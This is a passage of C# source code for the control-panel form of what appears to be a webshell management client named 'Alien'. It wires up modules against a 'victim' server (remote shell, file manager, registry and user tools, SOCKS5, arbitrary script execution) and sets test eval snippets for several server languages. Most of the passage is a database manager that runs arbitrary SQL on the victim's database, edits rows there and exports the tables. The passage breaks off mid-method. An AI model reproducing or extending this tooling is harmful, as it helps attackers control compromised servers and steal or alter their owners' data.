using ICSharpCode.TextEditor;
using ICSharpCode.TextEditor.Actions;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.Entity.Core.Common.CommandTrees;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices.JavaScript;
using System.Text;
using System.Text.Json.Serialization;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using System.Xml.Linq;
using Newtonsoft.Json;
using System.Web;
using System.Runtime.InteropServices.Marshalling;
using Newtonsoft.Json.Linq;
using Microsoft.VisualBasic;
using ICSharpCode.TextEditor.Document;
using ICSharpCode.TextEditor.Src.Document.FoldingStrategy;
using System.Globalization;
using System.Reflection.Metadata;
using System.Data.Entity.Core.Metadata.Edm;
using System.Text.Json.Nodes;

using static Alien.clsThemeManager;

namespace Alien
{
    public partial class frmControlPanel : BaseForm
    {
        private TabPage? draggedTab = null;

        public clsWeb m_web { get; init; }
        public clsVictim m_victim { get { return m_web.m_victim; } }

        private clsIniManager m_iniMgr { get; init; }

        private bool m_isReading = false;                   // Virtual Shell

        public clsfnInfoSpyder m_infoSpyder { get; init; }  // Infospyder
        public clsfnFileMgr m_fileMgr { get; init; }        // File Manager
        public clsfnShell m_rShell { get; set; }            // Remote Shell
        public clsfnDb m_dbMgr { get; init; }               // Database Manager
        public clsfnRunScript m_runScript { get; init; }    // Run Arbitrary Script
        public clsfnLAN m_lan { get; init; }                // LAN Tools
        public clsfnWinReg m_winReg { get; init; }          // Windows Registry
        public clsfnWinUser m_winUser { get; init; }        // Windows Users
        public clsfnPlugin m_plugin { get; init; }          // Plugins
        public clsfnSocks5 m_socks5 { get; init; }          // SOCKS5

        private WebBrowser m_ctrlInfoBrowser = new WebBrowser();
        private WebBrowser m_ctrlEvalBrowser = new WebBrowser();
        private TextEditorControlEx m_ctrlEvalEditor = new TextEditorControlEx();
        private TextEditorControlEx m_ctrlPostEditor = new TextEditorControlEx();

        private Dictionary<enLanguage, Func<enPayloadType, string>> m_dicEvalScript = new Dictionary<enLanguage, Func<enPayloadType, string>>()
        {
            {
                enLanguage.PHP,
                (method) =>
                {
                    return "phpinfo();";
                }
            },
            {
                enLanguage.ASP,
                (method) =>
                {
                    return "Response.Write \"ASP\"";
                }
            },
            {
                enLanguage.ASPX,
                (method) =>
                {
                    if (method == enPayloadType.OneShell)
                        return "Response.Write(\"JScript ASPX\");";
                    else if (method == enPayloadType.DarkMatter)
                        return "int a = 1;\r\nint b = 2;\r\nreturn a + b;";
                    else
                        return string.Empty;
                }
            },
            {
                enLanguage.ASHX,
                (method) =>
                {
                    if (method == enPayloadType.OneShell)
                        return "Response.Write(\"JScript ASPX\");";
                    else if (method == enPayloadType.DarkMatter)
                        return "int a = 1;\r\nint b = 2;\r\nreturn a + b;";
                    else
                        return string.Empty;
                }
            },
            {
                enLanguage.ASMX,
                (method) =>
                {
                    if (method == enPayloadType.OneShell)
                        return "Response.Write(\"JScript ASPX\");";
                    else if (method == enPayloadType.DarkMatter)
                        return "int a = 1;\r\nint b = 2;\r\nreturn a + b;";
                    else
                        return string.Empty;
                }
            },
            {
                enLanguage.JSP,
                (method) =>
                {
                    if (method == enPayloadType.OneShell)
                        return "response.getWriter().println(\"Hello here is the test\");";
                    else if (method == enPayloadType.DarkMatter)
                        return "int a = 1;\r\nint b = 1;\r\nreturn a + b;";
                    else
                        return string.Empty;
                }
            },
            {
                enLanguage.JSPX,
                (method) =>
                {
                    if (method == enPayloadType.OneShell)
                        return "response.getWriter().println(\"Hello here is the test\");";
                    else if (method == enPayloadType.DarkMatter)
                        return "int a = 1;\r\nint b = 1;\r\nreturn a + b;";
                    else
                        return string.Empty;
                }
            },
            {
                enLanguage.CFM,
                (method) =>
                {
                    if (method == enPayloadType.DarkMatter)
                        return "int a = 1;\r\nint b = 1;\r\nreturn a + b;";
                    else
                        return string.Empty;
                }
            },
            {
                enLanguage.Perl,
                (method) =>
                {
                    if (method == enPayloadType.OneShell)
                        return "print(\"Hello here is the test\")";
                    else
                        return string.Empty;
                }
            },
            {
                enLanguage.Ruby,
                (method) =>
                {
                    if (method == enPayloadType.OneShell)
                        return "puts \"Hello here is the test\"";
                    else
                        return string.Empty;
                }
            }
        };

        private string[] m_asImageExt =
        {
            "png", "jpg", "bmp", "ico",
        };
        private bool fnbIsImageFile(string szExtension) => m_asImageExt.Contains(szExtension.ToLower().Replace(".", string.Empty));

        public frmControlPanel(clsWeb web, clsIniManager iniMgr)
        {
            InitializeComponent();

            ThemeManager.Apply(this);

            m_web = web;

            m_infoSpyder = new clsfnInfoSpyder(web);
            m_fileMgr = new clsfnFileMgr(web);
            m_rShell = new clsfnShell(web);
            m_runScript = new clsfnRunScript(web);
            m_lan = new clsfnLAN(web);
            m_winReg = new clsfnWinReg(web);
            m_winUser = new clsfnWinUser(web);
            m_plugin = new clsfnPlugin(web);
            m_socks5 = new clsfnSocks5(web);

            m_dbMgr = new clsfnDb(web, "db.sqlite");

            m_iniMgr = iniMgr;
        }

        #region Classes

        private class clsDbTablePageControls
        {
            public clsfnDb m_dbMgr { get; init; }
            public clsfnDb.stDbConfig m_config { get; init; }
            public TreeNode m_nodeRoot { get; init; }
            public TabPage? page { get; init; }

            public ToolStrip? toolStrip { get; init; }
            public ListView? listView { get; init; }
            public TextBox? textBox { get; init; }

            public List<string> m_lsLastTable = new List<string>();

            private ImageList? dbListImageList { get; init; }

            public clsDbTablePageControls(clsfnDb dbMgr, clsfnDb.stDbConfig config, TreeNode nodeRoot, TabPage page, ImageList imageList, ContextMenuStrip menuTable)
            {
                m_dbMgr = dbMgr;
                m_config = config;
                m_nodeRoot = nodeRoot;

                if (page.Controls.Count > 0)
                {
                    listView = page.Controls.OfType<ListView>().FirstOrDefault();
                    toolStrip = page.Controls.OfType<ToolStrip>().FirstOrDefault();
                    textBox = page.Controls.OfType<TextBox>().FirstOrDefault();

                    dbListImageList = listView.LargeImageList;

                    return;
                }

                dbListImageList = new ImageList();
                dbListImageList.ImageSize = new Size(60, 60);
                dbListImageList.ColorDepth = ColorDepth.Depth32Bit;

                foreach (string? szKey in imageList.Images.Keys)
                {
                    if (string.IsNullOrEmpty(szKey))
                        continue;

                    Image? img = imageList.Images[szKey];
                    if (img == null)
                        continue;

                    Image imgNew = clsEzData.fnResizeImage(img, 60, 60);

                    dbListImageList.Images.Add(szKey, imgNew);
                }

                ToolStrip ts = new ToolStrip();
                ListView lv = new ListView();
                TextBox tb = new TextBox();

                this.page = page;
                this.page.Tag = this;

                toolStrip = ts;
                listView = lv;
                textBox = tb;

                ToolStripButton btnRefresh = new ToolStripButton("Refresh");
                btnRefresh.DisplayStyle = ToolStripItemDisplayStyle.Text;

                ToolStripButton btnNew = new ToolStripButton("New");
                btnNew.DisplayStyle = ToolStripItemDisplayStyle.Text;

                ts.Items.AddRange(new ToolStripItem[]
                {
                    btnRefresh,
                    btnNew,
                });

                page.Controls.Add(ts);
                page.Controls.Add(lv);
                page.Controls.Add(tb);

                ts.Font = new Font("Microsoft JhengHei", 11F, FontStyle.Regular);

                ts.Dock = DockStyle.Top;
                lv.Dock = DockStyle.Fill;
                tb.Dock = DockStyle.Bottom;

                tb.SendToBack();
                lv.BringToFront();

                lv.View = View.LargeIcon;
                lv.ContextMenuStrip = menuTable;

                ThemeManager.Apply(page);

                // ImageList
                lv.LargeImageList = dbListImageList;

                btnRefresh.Click += async (s, e) =>
                {
                    try
                    {
                        string szDbName = nodeRoot.Text;
                        var lsTables = await m_dbMgr.fnDbGetTables(config, szDbName);

                        if (lsTables.Count == 0)
                        {
                            MessageBox.Show($"Cannot find any table in \"{szDbName}\"", "It is empty!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        }

                        lv.Items.Clear();

                        foreach (string szTable in lsTables)
                        {
                            ListViewItem item = new ListViewItem(szTable);
                            item.ImageKey = "table";

                            lv.Items.Add(item);
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                };
                btnNew.Click += (s, e) =>
                {
                    try
                    {
                        string szDbName = nodeRoot.Text;
                        TabPage pageNewTable = new TabPage($"New Table ({szDbName})");

                        if (page.Parent == null)
                            return;

                        TabControl control = (TabControl)page.Parent;
                        control.TabPages.Add(pageNewTable);
                        control.SelectedTab = pageNewTable;

                        clsDbNewTableControls ctrlsNewTable = new clsDbNewTableControls(pageNewTable, config, m_dbMgr, szDbName);
                        pageNewTable.Tag = ctrlsNewTable;
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                };
            }
        }
        private class clsDbSqlResultControls
        {
            private clsfnDb.stDbConfig m_cfg { get; init; }
            private clsfnDb m_dbMgr { get; init; }

            public TextBox? textBox { get; init; }
            public DataGridView? dataGridView { get; init; }
            public ToolStrip? toolStrip { get; init; }

            private TabPage? m_page;
            private DataTable? m_dt = null;
            private string m_szDbName;
            private string m_szTableName;

            public clsDbSqlResultControls(TabPage page, clsfnDb.stDbConfig config, clsfnDb dbMgr, string szDbName, string szTableName)
            {
                m_cfg = config;
                m_dbMgr = dbMgr;
                m_szDbName = szDbName;
                m_szTableName = szTableName;
                m_page = page;

                if (page.Controls.Count > 0)
                {
                    dataGridView = page.Controls.OfType<DataGridView>().FirstOrDefault();
                    textBox = page.Controls.OfType<TextBox>().FirstOrDefault();
                    toolStrip = page.Controls.OfType<ToolStrip>().FirstOrDefault();

                    return;
                }

                textBox = new TextBox();
                dataGridView = new DataGridView();
                toolStrip = new ToolStrip();

                dataGridView.AllowUserToAddRows = true;
                dataGridView.AllowUserToDeleteRows = true;

                page.Controls.Add(textBox);
                page.Controls.Add(toolStrip);
                page.Controls.Add(dataGridView);

                dataGridView.BringToFront();

                textBox.Dock = DockStyle.Top;
                dataGridView.Dock = DockStyle.Fill;

                toolStrip.Font = page.Font;

                ToolStripButton btnExport = new ToolStripButton("Export");
                toolStrip.Items.Add(btnExport);

                ThemeManager.Apply(page);

                btnExport.Dock = DockStyle.Top;
                btnExport.Click += (s, e) =>
                {
                    if (dataGridView.Rows.Count == 0)
                    {
                        MessageBox.Show("No any data was found...", "Nothing!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        return;
                    }

                    using (SaveFileDialog sfd = new SaveFileDialog())
                    {
                        sfd.Filter = "CSV File (*.csv)|*.csv|SQL File (*.sql)|*.sql";
                        sfd.FileName = $"{m_szTableName}_export";

                        try
                        {
                            if (sfd.ShowDialog() == DialogResult.OK)
                            {
                                string szExt = Path.GetExtension(sfd.FileName).ToLower();
                                if (szExt == ".csv")
                                {
                                    fnExportToCSV(sfd.FileName);
                                }
                                else if (szExt == ".sql")
                                {
                                    fnExportToSQL(sfd.FileName);
                                }
                                else
                                {
                                    throw new Exception("Unknown file extension: " + szExt);
                                }

                                MessageBox.Show("Export data successfully: " + sfd.FileName, "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            }
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                };

                textBox.KeyDown += async (s, e) =>
                {
                    if (e.KeyCode == Keys.Enter)
                    {
                        string szQuery = textBox.Text;
                        DataTable dt = await m_dbMgr.fnSqlQuery(m_cfg, szQuery);

                        dataGridView.DataSource = dt;
                    }
                };

                dataGridView.RowValidated += async (s, e) =>
                {
                    if (await fnbDbSaveRemoteChanges())
                    {
                        page.Text = page.Text.Replace(" *", string.Empty).Trim();
                    }
                };
                dataGridView.UserDeletedRow += async (s, e) =>
                {
                    if (await fnbDbSaveRemoteChanges())
                    {
                        page.Text = page.Text.Replace(" *", string.Empty).Trim();
                    }
                };
                dataGridView.KeyDown += async (s, e) =>
                {
                    if (e.Control && e.KeyCode == Keys.S)
                    {
                        e.SuppressKeyPress = true;

                        if (await fnbDbSaveRemoteChanges())
                        {
                            page.Text = page.Text.Replace(" *", string.Empty).Trim();
                        }
                    }
                };
                dataGridView.CellValueChanged += (s, e) =>
                {
                    if (!page.Text.Contains("*"))
                    {
                        page.Text += " *";
                    }
                };
                dataGridView.UserAddedRow += (s, e) =>
                {
                    if (!page.Text.Contains("*"))
                    {
                        page.Text += " *";
                    }
                };
            }

            /// <summary>
            /// Save SQL dta as *.csv file
            /// </summary>
            /// <param name="szFilePath">Destination file path</param>
            private void fnExportToCSV(string szFilePath)
            {
                StringBuilder sb = new StringBuilder();
                var colNames = dataGridView.Columns.Cast<DataGridViewColumn>().Select(s => s.Name);
                sb.AppendLine(string.Join(",", colNames));

                foreach (DataGridViewRow row in dataGridView.Rows)
                {
                    if (row.IsNewRow)
                        continue;

                    var fields = row.Cells.Cast<DataGridViewCell>().Select(cell =>
                    {
                        string szVal = cell.Value?.ToString() ?? string.Empty;
                        if (szVal.Contains(",") || szVal.Contains("\n") || szVal.Contains("\""))
                            szVal = $"\"{szVal.Replace("\"", "\"\"")}\"";

                        return szVal;
                    });

                    sb.AppendLine(string.Join(",", fields));
                }

                File.WriteAllText(szFilePath, sb.ToString(), Encoding.UTF8);
            }

            /// <summary>
            /// Save SQL data as *.sql file
            /// </summary>
            /// <param name="szFilePath">Destination file path</param>
            private void fnExportToSQL(string szFilePath)
            {
                StringBuilder sb = new StringBuilder();
                sb.AppendLine($"-- Exported from \"{m_cfg.szSource}\"");
                sb.AppendLine($"-- Table: {m_szTableName}");
                sb.AppendLine($"-- Data: {DateTime.Now}");

                foreach (DataGridViewRow row in dataGridView.Rows)
                {
                    if (row.IsNewRow)
                        continue;

                    var lsColumn = new List<string>();
                    var lsValue = new List<string>();

                    foreach (DataGridViewColumn col in dataGridView.Columns)
                    {
                        lsColumn.Add(fnQuoteIdentifier(col.Name));

                        object val = row.Cells[col.Index].Value;
                        lsValue.Add(fnEscapeSqlValue(val));
                    }

                    sb.AppendLine($"INSERT INTO {fnQuoteIdentifier(m_szTableName)} ({string.Join(", ", lsColumn)}) VALUES ({string.Join(", ", lsValue)});");
                }

                File.WriteAllText(szFilePath, sb.ToString(), Encoding.UTF8);
            }

            /// <summary>
            /// Save datatable modification to remote server.
            /// </summary>
            /// <returns></returns>
            private async Task<bool> fnbDbSaveRemoteChanges()
            {
                if (dataGridView.DataSource == null || string.IsNullOrEmpty(m_szTableName))
                    return false;

                m_dt = (DataTable)dataGridView.DataSource;
                DataTable? dtChange = m_dt.GetChanges();
                if (dtChange == null)
                    return false;

                try
                {
                    foreach (DataRow dr in dtChange.Rows)
                    {
                        string szQuery = string.Empty;
                        if (dr.RowState == DataRowState.Added)
                        {
                            szQuery = fnBuildInsertSql(dr);
                        }
                        else if (dr.RowState == DataRowState.Modified)
                        {
                            szQuery = fnBuildUpdateSql(dr);
                        }
                        else if (dr.RowState == DataRowState.Deleted)
                        {
                            szQuery = fnBuildDeleteSql(dr);
                        }

                        if (!string.IsNullOrEmpty(szQuery))
                        {
                            var result = await m_dbMgr.fnSqlQueryEx(m_cfg, szQuery);
                            if (!result.bSuccess)
                                throw new Exception(result.szErrorMsg);
                        }
                        else
                        {
                            throw new Exception("SQL query is null or empty.");
                        }
                    }

                    m_dt.AcceptChanges();

                    return true;
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);

                    return false;
                }
            }

            /// <summary>
            /// 
            /// </summary>
            /// <returns></returns>
            private string fnGetFullTableName()
            {
                switch (m_cfg.enDbType)
                {
                    case enDatabase.MySQL:
                        return $"`{m_szDbName}`.`{m_szTableName}`";
                    case enDatabase.SQLServer:
                        return $"[{m_szDbName}].[dbo].[{m_szTableName}]";
                    case enDatabase.PostgreSQL:
                        return $"\"{m_szDbName}\".\"{m_szTableName}\"";
                    case enDatabase.SQLite:
                        return $"\"{m_szTableName}\"";
                    case enDatabase.Access:
                        return $"[{m_szTableName}]";
                    case enDatabase.Oracle:
                        return $"\"{m_szTableName}\"";
                    default:
                        return m_szTableName;
                }
            }

            /// <summary>
            /// 
            /// </summary>
            /// <param name="colName"></param>
            /// <returns></returns>
            private string fnQuoteIdentifier(string colName)
            {
                switch (m_cfg.enDbType)
                {
                    case enDatabase.MySQL:
                        return $"`{colName}`";
                    case enDatabase.SQLServer:
                    case enDatabase.Access:
                        return $"[{colName}]";
                    case enDatabase.PostgreSQL:
                    case enDatabase.SQLite:
                    case enDatabase.Oracle:
                        return $"\"{colName}\"";
                    default:
                        return colName;
                }
            }

            /// <summary>
            /// 
            /// </summary>
            /// <param name="row"></param>
            /// <returns></returns>
            private string fnBuildUpdateSql(DataRow row)
            {
                var sets = new List<string>();
                var wheres = new List<string>();

                foreach (DataColumn col in row.Table.Columns)
                {
                    string quotedCol = fnQuoteIdentifier(col.ColumnName);
                    object currentVal = row[col, DataRowVersion.Current];
                    object originalVal = row[col, DataRowVersion.Original];

                    if (!Equals(currentVal, originalVal))
                    {
                        sets.Add($"{quotedCol} = {fnEscapeSqlValue(currentVal)}");
                    }

                    if (originalVal == null || originalVal == DBNull.Value)
                    {
                        wheres.Add($"{quotedCol} IS NULL");
                    }
                    else
                    {

                        wheres.Add($"{quotedCol} = {fnEscapeSqlValue(originalVal)}");
                    }
                }

                if (sets.Count == 0) return "";

                return $"UPDATE {fnGetFullTableName()} SET {string.Join(", ", sets)} WHERE {string.Join(" AND ", wheres)};";
            }

            /// <summary>
            /// 
            /// </summary>
            /// <param name="row"></param>
            /// <returns></returns>
            private string fnBuildDeleteSql(DataRow row)
            {
                var wheres = new List<string>();
                foreach (DataColumn col in row.Table.Columns)
                {
                    string quotedCol = fnQuoteIdentifier(col.ColumnName);
                    object originalVal = row[col, DataRowVersion.Original];

                    if (originalVal == null || originalVal == DBNull.Value)
                    {
                        wheres.Add($"{quotedCol} IS NULL");
                    }
                    else
                    {
                        wheres.Add($"{quotedCol} = {fnEscapeSqlValue(originalVal)}");
                    }
                }

                return $"DELETE FROM {fnGetFullTableName()} WHERE {string.Join(" AND ", wheres)};";
            }

            /// <summary>
            /// 
            /// </summary>
            /// <param name="row"></param>
            /// <returns></returns>
            private string fnBuildInsertSql(DataRow row)
            {
                var columns = new List<string>();
                var values = new List<string>();

                foreach (DataColumn col in row.Table.Columns)
                {
                    object val = row[col];
                    if (val == DBNull.Value) continue;

                    columns.Add(fnQuoteIdentifier(col.ColumnName));
                    values.Add(fnEscapeSqlValue(val));
                }

                return $"INSERT INTO {fnGetFullTableName()} ({string.Join(", ", columns)}) VALUES ({string.Join(", ", values)});";
            }

            /// <summary>
            /// 
            /// </summary>
            /// <param name="value"></param>
            /// <returns></returns>
            private string? fnEscapeSqlValue(object value)
            {
                if (value == null || value == DBNull.Value) return "NULL";

                if (value is string || value is DateTime)
                {
                    string str = value.ToString().Replace("'", "''");
                    return $"'{str}'";
                }
                if (value is bool b)
                {
                    return b ? "1" : "0";
                }

                return value.ToString();
            }
        }
        private class clsDbSqlShellControls
        {
            private clsfnDb.stDbConfig m_config { get; init; }
            private clsfnDb m_dbMgr { get; init; }

            private SplitContainer splitContainer { get; init; }

            public int m_nPromitStart { get; set; }
            public string m_szPrompt { get { return $"{m_config.szSource}({Enum.GetName(typeof(enDatabase), m_config.enDbType)})> "; } }

            public RichTextBox richTextBox { get; init; }
            public ToolStrip toolStrip { get; init; }
            public TextEditorControlEx textEditorControl { get; init; }

            private List<string> m_lsSqlHistory = new List<string>();
            private int m_nIdxSQL = 0;

            public clsDbSqlShellControls(TabPage page, clsfnDb.stDbConfig config, clsfnDb dbMgr)
            {
                m_config = config;
                m_dbMgr = dbMgr;

                splitContainer = new SplitContainer();
                toolStrip = new ToolStrip();
                richTextBox = new RichTextBox();
                textEditorControl = new TextEditorControlEx();

                page.Controls.Add(splitContainer);
                splitContainer.FixedPanel = FixedPanel.Panel2;
                splitContainer.Panel1.Controls.Add(richTextBox);
                splitContainer.Panel2.Controls.Add(toolStrip);
                splitContainer.Panel2.Controls.Add(textEditorControl);

                splitContainer.Orientation = Orientation.Horizontal;
                splitContainer.Dock = DockStyle.Fill;
                splitContainer.SplitterDistance = 200;

                richTextBox.Font = new Font("Consolas", page.Font.Size);
                richTextBox.BackColor = Color.Black;
                richTextBox.ForeColor = Color.White;
                richTextBox.Dock = DockStyle.Fill;
                richTextBox.WordWrap = false;

                richTextBox.BringToFront();

                textEditorControl.Dock = DockStyle.Fill;
                textEditorControl.BringToFront();

                ToolStripButton btnExec = new ToolStripButton("Execute");
                ToolStripComboBox comboSQL = new ToolStripComboBox();

                toolStrip.Items.AddRange(new ToolStripItem[]
                {
                    btnExec,
                    new ToolStripLabel() { Text = " | " },
                    new ToolStripLabel() { Text = "SQL: " },
                    comboSQL,
                });
                toolStrip.Font = page.Font;

                ThemeManager.ApplyRange(page.Controls);

                comboSQL.ComboBox.Width = 300;

                string szJson = Path.Combine(Application.StartupPath, "Tools", "useful_sql.json");
                if (File.Exists(szJson))
                {
                    try
                    {
                        string szContent = File.ReadAllText(szJson);
                        var jsonObj = JObject.Parse(szContent);
                        var databases = jsonObj["databases"];

                        string? szTargetDB = Enum.GetName(typeof(enDatabase), config.enDbType);
                        if (string.IsNullOrEmpty(szTargetDB))
                            throw new Exception("Unknown database type");

                        var sqlList = databases?[szTargetDB];
                        if (sqlList == null)
                            throw new Exception("JSON error.");

                        comboSQL.ComboBox.Items.Clear();

                        Dictionary<string, string> dicSQL = new Dictionary<string, string>();

                        foreach (var item in sqlList)
                        {
                            string? szName = item["name"]?.ToString();
                            string? szSQL = item["sql"]?.ToString();

                            if (string.IsNullOrEmpty(szName) || string.IsNullOrEmpty(szSQL))
                                continue;

                            dicSQL.Add(szName, szSQL);
                            comboSQL.Items.Add(szName);
                        }

                        comboSQL.SelectedIndexChanged += (s, e) =>
                        {
                            string szName = comboSQL.Text;
                            if (!dicSQL.ContainsKey(szName))
                                return;

                            string szSQL = dicSQL[szName];
                            
                            textEditorControl.Text = szSQL;
                            textEditorControl.Refresh();
                        };

                        if (comboSQL.Items.Count > 0)
                            comboSQL.SelectedIndex = 0;
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }

                btnExec.Click += async (s, e) =>
                {
                    string szSQL = textEditorControl.Text;
                    if (string.IsNullOrEmpty(szSQL))
                        return;

                    szSQL = m_dbMgr.fnToSingleLineSql(szSQL);

                    DataTable dt = await m_dbMgr.fnSqlQuery(m_config, szSQL);

                    richTextBox.AppendText("\n\nExecute SQL result:\n\n");
                    richTextBox.AppendText(clsfnDb.fnPrintTable(dt));
                    richTextBox.AppendText("\n");

                    richTextBox.AppendText(m_szPrompt);
                    richTextBox.ScrollToCaret();
                    m_nPromitStart = richTextBox.TextLength;

                    fnPushSQL(szSQL);
                };
            }

            /// <summary>
            /// 
            /// </summary>
            /// <returns></returns>
            public string fnPreviousSQL()
            {
                if (m_lsSqlHistory.Count == 0)
                    return string.Empty;

                if (m_nIdxSQL == m_lsSqlHistory.Count - 1)
                {
                    string szSQL = m_lsSqlHistory[m_nIdxSQL];
                    m_nIdxSQL--;

                    return szSQL;
                }

                m_nIdxSQL--;
                if (m_nIdxSQL < 0)
                    m_nIdxSQL = 0;

                return m_lsSqlHistory[m_nIdxSQL];
            }

            /// <summary>
            /// 
            /// </summary>
            /// <returns></returns>
            public string fnNextSQL()
            {
                if (m_lsSqlHistory.Count == 0)
                    return string.Empty;

                m_nIdxSQL++;
                if (m_nIdxSQL > m_lsSqlHistory.Count - 1)
                    fnResetSqlIndex();

                return m_lsSqlHistory[m_nIdxSQL];
            }

            /// <summary>
            /// Reset History SQL command index.
            /// </summary>
            private void fnResetSqlIndex()
            {
                m_nIdxSQL = m_lsSqlHistory.Count - 1;
                if (m_nIdxSQL < 0)
                    m_nIdxSQL = 0;
            }

            /// <summary>
            /// Add SQL command into History List.
            /// </summary>
            /// <param name="szSQL"></param>
            public void fnPushSQL(string szSQL)
            {
                m_lsSqlHistory.Add(szSQL);
                fnResetSqlIndex();
            }
        }
        private class clsDbInformation
        {
            public TabPage m_page { get; init; }
            public clsfnDb.stDbConfig m_config { get; init; }

            public RichTextBox richTextBox { get; init; }

            public clsDbInformation(TabPage page, clsfnDb.stDbConfig config)
            {
                m_page = page;
                m_config = config;

                richTextBox = new RichTextBox();
                richTextBox.WordWrap = false;

                page.Tag = this;
                page.Controls.Add(richTextBox);

                richTextBox.Dock = DockStyle.Fill;
                richTextBox.BackColor = Color.Black;
                richTextBox.ForeColor = Color.White;
                richTextBox.Font = new Font("Consolas", page.Font.Size);
            }
        }
        private class clsDbNewTableControls
        {
            private clsfnDb.stDbConfig m_cfg { get; init; }
            private clsfnDb m_dbMgr { get; init; }
            private TabPage m_page;
            private string m_szDbName;

            public TextBox txtTableName { get; init; }
            public DataGridView dgvSchema { get; init; }
            public ToolStrip toolStrip { get; init; }

            public clsDbNewTableControls(TabPage page, clsfnDb.stDbConfig config, clsfnDb dbMgr, string szDbName)
            {
                m_page = page;
                m_cfg = config;
                m_dbMgr = dbMgr;
                m_szDbName = szDbName;

                txtTableName = new TextBox
                {
                    PlaceholderText = "Please enter a new table name (ex. t_new_orders)",
                    Dock = DockStyle.Top
                };
                dgvSchema = new DataGridView
                {
                    Dock = DockStyle.Fill,
                    AllowUserToAddRows = true,
                    AllowUserToDeleteRows = true
                };
                toolStrip = new ToolStrip
                {
                    Dock = DockStyle.Top
                };

                ToolStripButton btnCreate = new ToolStripButton("Execute");
                btnCreate.Click += async (s, e) =>
                {
                    await fnExecute();
                };
                toolStrip.Items.Add(btnCreate);

                fnInitSchemaGrid();

                page.Controls.Add(dgvSchema);
                page.Controls.Add(toolStrip);
                page.Controls.Add(txtTableName);

                ThemeManager.ApplyRange(page.Controls);

                dgvSchema.BringToFront();
            }

            private void fnInitSchemaGrid()
            {
                dgvSchema.Columns.Add("ColName", "Column Name");

                DataGridViewComboBoxColumn typeCol = new DataGridViewComboBoxColumn { Name = "ColType", HeaderText = "DataType" };

                switch (m_cfg.enDbType)
                {
                    case enDatabase.Oracle:
                        typeCol.Items.AddRange("VARCHAR2", "NUMBER", "DATE", "CLOB", "TIMESTAMP");
                        break;
                    case enDatabase.SQLServer:
                        typeCol.Items.AddRange("VARCHAR", "NVARCHAR", "INT", "BIGINT", "TEXT", "DATETIME", "DECIMAL", "BIT");
                        break;
                    case enDatabase.PostgreSQL:
                        typeCol.Items.AddRange("VARCHAR", "INTEGER", "BIGINT", "TEXT", "TIMESTAMP", "NUMERIC", "BOOLEAN");
                        break;
                    case enDatabase.SQLite:
                        typeCol.Items.AddRange("TEXT", "INTEGER", "REAL", "BLOB");
                        break;
                    case enDatabase.MySQL:
                    default:
                        typeCol.Items.AddRange("VARCHAR", "INT", "BIGINT", "TEXT", "DATETIME", "DECIMAL", "BOOLEAN");
                        break;
                }

                dgvSchema.Columns.Add(typeCol);

                dgvSchema.Columns.Add("ColLength", "Length");

                DataGridViewCheckBoxColumn nullCol = new DataGridViewCheckBoxColumn { Name = "ColNull", HeaderText = "Allow Null", DefaultCellStyle = { NullValue = true } };
                dgvSchema.Columns.Add(nullCol);

                DataGridViewCheckBoxColumn pkCol = new DataGridViewCheckBoxColumn { Name = "ColPK", HeaderText = "Primary Key (PK)" };
                dgvSchema.Columns.Add(pkCol);
            }

            private async Task fnExecute()
            {
                string szTableName = txtTableName.Text.Trim();
                if (string.IsNullOrEmpty(szTableName))
                {
                    MessageBox.Show("Please enter table name", "NO!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                if (dgvSchema.Rows.Count <= 1)
                {
                    MessageBox.Show("Please create at least one row.", "NO!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                List<string> lsColumn = new List<string>();
                List<string> lsPK = new List<string>();

                foreach (DataGridViewRow row in dgvSchema.Rows)
                {
                    if (row.IsNewRow) continue;

                    string? szColName = row.Cells["ColName"].Value?.ToString()?.Trim();
                    string? szColType = row.Cells["ColType"].Value?.ToString();
                    string? szColLength = row.Cells["ColLength"].Value?.ToString()?.Trim();
                    bool bAllowNull = Convert.ToBoolean(row.Cells["ColNull"].Value ?? true);
                    bool bIsPk = Convert.ToBoolean(row.Cells["ColPK"].Value ?? false);

                    if (string.IsNullOrEmpty(szColName) || string.IsNullOrEmpty(szColType))
                        continue;

                    string szLengthStr = !string.IsNullOrEmpty(szColLength) ? $"({szColLength})" : "";
                    string szNullStr = bAllowNull ? "NULL" : "NOT NULL";

                    lsColumn.Add($"`{szColName}` {szColType}{szLengthStr} {szNullStr}");

                    if (bIsPk)
                        lsPK.Add($"`{szColName}`");
                }

                if (lsPK.Count > 0)
                    lsColumn.Add($"PRIMARY KEY ({string.Join(", ", lsPK)})");

                string qTable = string.Empty;
                switch (m_cfg.enDbType)
                {
                    case enDatabase.MySQL:
                        qTable = $"`{m_szDbName}`.`{szTableName}`";
                        break;
                    case enDatabase.SQLServer:
                        qTable = $"[{m_szDbName}].dbo.[{szTableName}]";
                        break;
                    case enDatabase.PostgreSQL:
                    case enDatabase.Oracle:
                    case enDatabase.SQLite:
                        qTable = $"\"{szTableName}\"";
                        break;
                    default:
                        qTable = szTableName;
                        break;
                }

                string szQuery = string.Empty;
                if (m_cfg.enDbType == enDatabase.MySQL)
                {
                    // MySQL
                    szQuery = $"CREATE TABLE {qTable} (\n{string.Join(",\n", lsColumn)}\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;";
                }
                else
                {
                    // SQL Server, PostgreSQL, SQLite, Oracle.
                    szQuery = $"CREATE TABLE {qTable} (\n{string.Join(",\n", lsColumn)}\n);";
                }

                try
                {
